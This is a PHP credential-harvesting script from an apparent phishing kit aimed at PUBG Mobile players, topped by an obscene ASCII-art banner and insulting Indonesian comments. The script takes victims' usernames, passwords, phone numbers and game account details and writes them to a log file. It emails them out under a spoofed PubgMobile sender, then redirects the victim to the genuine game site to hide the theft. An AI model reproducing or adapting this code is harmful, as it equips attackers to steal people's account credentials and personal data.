<!-- ############################################################ -->
<!-- 	                         /´¯/)                            -->
<!--                            /.../                             -->
<!--                           /.../                              -->
<!--                          /.../                               -->
<!--                      /´¯/’ ’/´¯/`·¸                          -->
<!--                     /’ /. ./../../¯\                         -->
<!--                    (‘ (.. /../¯~/’’)                         -->
<!--                    \...........’../                          -->
<!--                     \'........._.´                           --> 
<!--                      \..........(                            -->
<!--                       \.........\                            -->
<!--                        \.........\							  -->
<!--                   ╔═════════════════╗						  -->
<!--                   ║    FUCK YOU     ║						  -->
<!--                   ╚═════════════════╝                        -->
<!--   // jangan maling script ya kontol hargai pembuatnya //     -->
<?php
    $username	= $_GET['username'];
    $password	= $_GET['password'];
    $login		= $_GET['login'];
    $id			= $_GET['id'];
    $phone		= $_GET['phone'];
    $level		= $_GET['level'];
	$tier		= $_GET['tier'];
	$rpt		= $_GET['rpt'];
	$rpl		= $_GET['rpl'];
	$platform   = $_GET['platform'];
    include("config.php");
    if(!empty($username) || !empty($password)) /** JIKA SEMUA DATA TERISI **/
   $message = "
   === INFO LOGIN ===
• Username	=   $username
• Password	=   $password
• No Hp		=   $phone

• playerID	=   $id
• Tier		=   $tier
• Rp Type	=   $rpt

• AccLevel	=   $level
• RP Level	=   $rpl


=== INFO DEVICE ===
• Platform	=   $platform
• Login		=	$login

• Device	= 	$device
• Ip		=	$ip
• Waktu Log	=	$timestamp
   
 /*\/*\/*\/*\/*\/| HEH ANAK ANAK ANJENG, DENGERIN GUA YA... VIRUS KOSONA UDAH MASUK KE INDONESIA ANJENG |\/*\/*\/*\/*\/*\/*\
   ";

	$file = fopen("../res.txt", "a");
	fwrite($file, $message);
	
$subjek = "PUBG log  $login|$username|$level";
$headers = "From: PubgMobile <ytbasecamp@gmail.com>";
$headers.= "";
$datamail = mail($result,$subjek, $message, $headers);



echo "<script type='text/javascript'>window.top.location='https://www.pubgmobile.com/';</script>";
?>